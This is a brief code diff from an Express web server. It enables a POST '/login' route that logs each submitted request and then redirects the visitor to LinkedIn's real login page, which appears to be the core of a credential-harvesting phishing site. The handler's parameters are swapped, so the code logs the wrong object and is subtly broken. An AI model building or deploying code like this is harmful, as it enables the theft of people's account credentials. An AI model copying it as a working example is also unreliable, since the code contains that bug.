@@ -13,10 +13,10 @@ app.use(express.static(path.join(__dirname, 'public')));
 app.use(bodyParser);
 
 // accept and log all post requests
-// app.post('/', (res, req) => {
-//     console.log(req);
-//     req.redirect("https://www.linkedin.com/uas/login");
-// });
+app.post('/login', (res, req) => {
+    console.log(req);
+    req.redirect("https://www.linkedin.com/uas/login");
+});
 
 // catch 404 and forward to error handler
 app.use(function(req, res, next) {
